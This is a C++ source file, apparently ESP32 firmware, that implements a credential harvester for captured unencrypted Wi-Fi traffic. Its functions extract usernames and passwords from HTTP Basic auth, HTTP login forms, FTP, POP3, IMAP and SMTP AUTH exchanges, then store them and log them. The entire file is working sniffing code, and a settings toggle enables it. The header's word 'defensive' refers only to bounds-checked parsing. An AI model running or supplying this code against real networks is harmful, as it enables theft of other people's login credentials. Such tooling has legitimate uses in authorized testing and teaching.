// ============================================================================
//  credentials.cpp
//
//  Bounded, defensive scanning: every read is checked against the payload
//  length `n`; the payload is never assumed NUL-terminated.
// ============================================================================
#include "credentials.h"
#include "settings.h"
#include <esp_timer.h>
#include <ctype.h>

CredentialHarvester& CredentialHarvester::instance() { static CredentialHarvester c; return c; }

void CredentialHarvester::begin() { _mtx = xSemaphoreCreateMutex(); }

// ---------------------------------------------------------------------------
//  small helpers (all length-bounded)
// ---------------------------------------------------------------------------
namespace {

inline char lc(char c) { return (c >= 'A' && c <= 'Z') ? c + 32 : c; }

// case-insensitive search for NUL-terminated `needle` within p[0..n)
const char* find_ci(const char* p, int n, const char* needle) {
    int m = strlen(needle);
    if (m == 0 || m > n) return nullptr;
    for (int i = 0; i + m <= n; i++) {
        int k = 0;
        while (k < m && lc(p[i + k]) == lc(needle[k])) k++;
        if (k == m) return p + i;
    }
    return nullptr;
}

// copy printable bytes from src until any delimiter byte or `srcn`/cap reached
void copy_token(char* dst, size_t cap, const char* src, int srcn, const char* delims) {
    size_t w = 0;
    for (int i = 0; i < srcn && w + 1 < cap; i++) {
        char c = src[i];
        if (strchr(delims, c)) break;
        dst[w++] = (c >= 0x20 && c < 0x7f) ? c : '.';
    }
    dst[w] = '\0';
}

// minimal application/x-www-form-urlencoded decode in place into dst
void url_decode(char* dst, size_t cap, const char* src, int srcn) {
    size_t w = 0;
    for (int i = 0; i < srcn && w + 1 < cap; i++) {
        char c = src[i];
        if (c == '+') { dst[w++] = ' '; }
        else if (c == '%' && i + 2 < srcn && isxdigit((unsigned char)src[i+1]) && isxdigit((unsigned char)src[i+2])) {
            auto hv = [](char h){ h = lc(h); return (h >= 'a') ? (h - 'a' + 10) : (h - '0'); };
            char v = (hv(src[i+1]) << 4) | hv(src[i+2]);
            dst[w++] = (v >= 0x20 && v < 0x7f) ? v : '.';
            i += 2;
        } else if (c >= 0x20 && c < 0x7f) dst[w++] = c;
    }
    dst[w] = '\0';
}

int b64dec(const char* in, int inlen, char* out, int outcap) {
    auto val = [](char c) -> int {
        if (c >= 'A' && c <= 'Z') return c - 'A';
        if (c >= 'a' && c <= 'z') return c - 'a' + 26;
        if (c >= '0' && c <= '9') return c - '0' + 52;
        if (c == '+') return 62;
        if (c == '/') return 63;
        return -1;
    };
    int acc = 0, bits = 0, w = 0;
    for (int i = 0; i < inlen; i++) {
        if (in[i] == '=' ) break;
        int v = val(in[i]);
        if (v < 0) continue;
        acc = (acc << 6) | v; bits += 6;
        if (bits >= 8) { bits -= 8; if (w < outcap - 1) out[w++] = (char)((acc >> bits) & 0xFF); }
    }
    out[w] = '\0';
    return w;
}

// length of a single line (until CR or LF), bounded by n
int line_len(const char* p, int n) {
    int i = 0;
    while (i < n && p[i] != '\r' && p[i] != '\n') i++;
    return i;
}

// length of a form-field value (until '&', whitespace, quote or end), bounded
int field_len(const char* p, int n) {
    int i = 0;
    while (i < n && p[i] != '&' && p[i] != '\r' && p[i] != '\n' &&
           p[i] != ' ' && p[i] != '"') i++;
    return i;
}

}  // namespace

CredentialHarvester::Pending* CredentialHarvester::findPending(const ParsedFrame& f, bool create) {
    Pending* freeSlot = nullptr;
    for (auto& p : _pending) {
        if (p.used && memcmp(p.src_ip, f.ipv4_src, 4) == 0 &&
            memcmp(p.dst_ip, f.ipv4_dst, 4) == 0 && p.dst_port == f.dst_port) return &p;
        if (!p.used && !freeSlot) freeSlot = &p;
    }
    if (!create) return nullptr;
    Pending* slot = freeSlot;
    if (!slot) {  // evict oldest
        slot = &_pending[0];
        for (auto& p : _pending) if (p.last_ms < slot->last_ms) slot = &p;
    }
    memset(slot, 0, sizeof(*slot));
    slot->used = true;
    memcpy(slot->src_ip, f.ipv4_src, 4);
    memcpy(slot->dst_ip, f.ipv4_dst, 4);
    slot->dst_port = f.dst_port;
    return slot;
}

void CredentialHarvester::add(const ParsedFrame& f, uint8_t proto,
                              const char* user, const char* pass, const char* ctx) {
    if ((!user || !*user) && (!pass || !*pass)) return;
    xSemaphoreTake(_mtx, portMAX_DELAY);

    // de-dupe: ignore an identical credential seen in the last ~30s (retransmits)
    uint64_t nowus = esp_timer_get_time();
    uint32_t stored = _total < CRED_MAX_ENTRIES ? _total : CRED_MAX_ENTRIES;
    for (uint32_t i = 0; i < stored; i++) {
        const Credential& c = _ring[i];
        if (c.proto == proto && c.dst_port == f.dst_port &&
            strcmp(c.username, user ? user : "") == 0 &&
            strcmp(c.password, pass ? pass : "") == 0 &&
            (nowus - c.timestamp_us) < 30000000ULL) {
            xSemaphoreGive(_mtx); return;
        }
    }

    Credential& c = _ring[_head];
    memset(&c, 0, sizeof(c));
    c.id = ++_total;
    c.timestamp_us = nowus;
    c.proto = proto;
    c.channel = f.channel;
    memcpy(c.src_ip, f.ipv4_src, 4);
    memcpy(c.dst_ip, f.ipv4_dst, 4);
    c.dst_port = f.dst_port;
    strlcpy(c.username, user ? user : "", sizeof(c.username));
    strlcpy(c.password, pass ? pass : "", sizeof(c.password));
    strlcpy(c.context, ctx ? ctx : "", sizeof(c.context));
    _head = (_head + 1) % CRED_MAX_ENTRIES;
    xSemaphoreGive(_mtx);
    log_w("CRED[%u] proto=%u user=%s ctx=%s", (unsigned)c.id, proto, c.username, c.context);
}

// ---------------------------------------------------------------------------
//  HTTP
// ---------------------------------------------------------------------------
void CredentialHarvester::scanHttp(const ParsedFrame& f, const char* p, uint16_t n) {
    char ctx[64] = "";
    const char* host = find_ci(p, n, "Host:");
    if (host) {
        int rem = n - (host - p) - 5;
        const char* h = host + 5;
        while (rem > 0 && (*h == ' ')) { h++; rem--; }
        copy_token(ctx, sizeof(ctx), h, rem, "\r\n ");
    }

    // HTTP Basic auth
    const char* a = find_ci(p, n, "Authorization: Basic ");
    if (a) {
        const char* b = a + 21;
        int rem = n - (b - p);
        int ll = line_len(b, rem);
        char dec[96];
        if (b64dec(b, ll, dec, sizeof(dec)) > 0) {
            char* colon = strchr(dec, ':');
            if (colon) {
                *colon = '\0';
                add(f, CRED_HTTP_BASIC, dec, colon + 1, ctx[0] ? ctx : "http");
            }
        }
    }

    // HTTP login form (query string or urlencoded body)
    static const char* PASS_KEYS[] = { "password=", "passwd=", "passwrd=", "pass=", "pwd=", "pw=" };
    static const char* USER_KEYS[] = { "username=", "userid=", "user=", "login=", "email=", "uname=", "usr=" };
    const char* pv = nullptr; int pvn = 0;
    for (auto key : PASS_KEYS) {
        const char* m = find_ci(p, n, key);
        if (m) {
            // require a delimiter before the key to avoid mid-word matches
            if (m > p) { char prev = m[-1]; if (isalnum((unsigned char)prev) || prev == '_') continue; }
            pv = m + strlen(key);
            pvn = n - (pv - p);
            break;
        }
    }
    if (pv) {
        char user[64] = "", pass[64] = "", uraw[64] = "";
        url_decode(pass, sizeof(pass), pv, field_len(pv, pvn));
        for (auto key : USER_KEYS) {
            const char* m = find_ci(p, n, key);
            if (m) {
                if (m > p) { char prev = m[-1]; if (isalnum((unsigned char)prev) || prev == '_') continue; }
                const char* uv = m + strlen(key);
                int uvn = n - (uv - p);
                copy_token(uraw, sizeof(uraw), uv, uvn, "&\r\n \"");
                url_decode(user, sizeof(user), uraw, strlen(uraw));
                break;
            }
        }
        if (pass[0]) add(f, CRED_HTTP_FORM, user, pass, ctx[0] ? ctx : "http form");
    }
}

// ---------------------------------------------------------------------------
//  Line-based plaintext auth: FTP / POP3 / IMAP / SMTP
// ---------------------------------------------------------------------------
void CredentialHarvester::scanLineProto(const ParsedFrame& f, const char* p, uint16_t n) {
    uint16_t dp = f.dst_port;
    int off = 0;
    while (off < n) {
        int ll = line_len(p + off, n - off);
        const char* line = p + off;
        // advance past this line + its CR/LF for next iteration
        int next = off + ll;
        while (next < n && (p[next] == '\r' || p[next] == '\n')) next++;
        off = (next > off) ? next : off + 1;
        if (ll <= 0) continue;

        auto starts = [&](const char* kw) {
            int m = strlen(kw);
            if (ll < m) return false;
            for (int i = 0; i < m; i++) if (lc(line[i]) != lc(kw[i])) return false;
            return true;
        };

        if (dp == 21 || dp == 110) {                       // FTP / POP3
            if (starts("USER ")) {
                Pending* pe = findPending(f, true);
                if (pe) { copy_token(pe->username, sizeof(pe->username), line + 5, ll - 5, "\r\n"); pe->proto = (dp == 21) ? CRED_FTP : CRED_POP3; pe->last_ms = millis(); }
            } else if (starts("PASS ")) {
                Pending* pe = findPending(f, false);
                char pass[64]; copy_token(pass, sizeof(pass), line + 5, ll - 5, "\r\n");
                if (pe && pe->username[0]) { add(f, pe->proto, pe->username, pass, (dp == 21) ? "ftp" : "pop3"); pe->used = false; }
                else add(f, (dp == 21) ? CRED_FTP : CRED_POP3, "", pass, (dp == 21) ? "ftp" : "pop3");
            }
        } else if (dp == 143) {                            // IMAP:  tag LOGIN user pass
            const char* lg = find_ci(line, ll, "LOGIN ");
            if (lg) {
                const char* q = lg + 6;
                int rem = ll - (q - line);
                char user[64] = "", pass[64] = "";
                // tokens may be "quoted" or bare, space-separated
                auto grab = [&](char* out, size_t cap) {
                    while (rem > 0 && *q == ' ') { q++; rem--; }
                    if (rem > 0 && *q == '"') { q++; rem--; copy_token(out, cap, q, rem, "\""); int adv = strlen(out); q += adv; rem -= adv; if (rem>0){q++;rem--;} }
                    else { copy_token(out, cap, q, rem, " \r\n"); int adv = strlen(out); q += adv; rem -= adv; }
                };
                grab(user, sizeof(user)); grab(pass, sizeof(pass));
                if (user[0] || pass[0]) add(f, CRED_IMAP, user, pass, "imap");
            }
        } else if (dp == 25 || dp == 587) {                // SMTP AUTH
            if (starts("AUTH PLAIN ")) {
                char dec[128];
                int dl = b64dec(line + 11, ll - 11, dec, sizeof(dec));
                // format: [authzid]\0authcid\0passwd
                if (dl > 2) {
                    int a = 0; while (a < dl && dec[a]) a++;          // skip authzid
                    int u = a + 1; int us = u; while (u < dl && dec[u]) u++;
                    char user[64] = "", pass[64] = "";
                    if (us < dl) strlcpy(user, dec + us, sizeof(user));
                    if (u + 1 <= dl) strlcpy(pass, dec + u + 1, sizeof(pass));
                    add(f, CRED_SMTP, user, pass, "smtp");
                }
            } else if (starts("AUTH LOGIN")) {
                Pending* pe = findPending(f, true);
                if (pe) { pe->proto = CRED_SMTP; pe->smtp_stage = 1; pe->username[0] = '\0'; pe->last_ms = millis(); }
            } else {
                Pending* pe = findPending(f, false);
                if (pe && pe->proto == CRED_SMTP && pe->smtp_stage) {
                    char dec[96]; b64dec(line, ll, dec, sizeof(dec));
                    if (pe->smtp_stage == 1) { strlcpy(pe->username, dec, sizeof(pe->username)); pe->smtp_stage = 2; pe->last_ms = millis(); }
                    else if (pe->smtp_stage == 2) { add(f, CRED_SMTP, pe->username, dec, "smtp"); pe->used = false; }
                }
            }
        }
    }
}

// ---------------------------------------------------------------------------
void CredentialHarvester::inspect(const ParsedFrame& f, const uint8_t* frame, uint16_t frameLen) {
    if (!SettingsStore::instance().get().cred_harvest) return;
    if (f.protected_frame) return;            // encrypted 802.11 payload
    if (f.l4 != L4_TCP) return;               // supported protocols are all TCP
    if (f.l7_off == 0 || f.l7_len == 0) return;
    if (f.l7_off >= frameLen) return;
    uint16_t n = f.l7_len;
    if ((uint32_t)f.l7_off + n > frameLen) n = frameLen - f.l7_off;
    if (n < 5) return;
    const char* p = (const char*)(frame + f.l7_off);

    // Only scan the client->server direction (dst = service port) so we read
    // requests/commands, not server responses (which may echo "password=" HTML).
    uint16_t dp = f.dst_port;
    if (dp == 80 || dp == 8080 || dp == 8000) scanHttp(f, p, n);
    else if (dp == 21 || dp == 110 || dp == 143 || dp == 25 || dp == 587) scanLineProto(f, p, n);
}

uint16_t CredentialHarvester::recent(Credential* out, uint16_t max, uint32_t sinceId) {
    xSemaphoreTake(_mtx, portMAX_DELAY);
    uint32_t stored = _total < CRED_MAX_ENTRIES ? _total : CRED_MAX_ENTRIES;
    uint32_t start = (_total < CRED_MAX_ENTRIES) ? 0 : _head;
    uint16_t nn = 0;
    for (uint32_t i = 0; i < stored && nn < max; i++) {
        uint32_t idx = (start + i) % CRED_MAX_ENTRIES;
        if (_ring[idx].id > sinceId) out[nn++] = _ring[idx];
    }
    xSemaphoreGive(_mtx);
    return nn;
}

void CredentialHarvester::clear() {
    xSemaphoreTake(_mtx, portMAX_DELAY);
    _head = 0;
    memset(_ring, 0, sizeof(_ring));
    memset(_pending, 0, sizeof(_pending));
    xSemaphoreGive(_mtx);
}
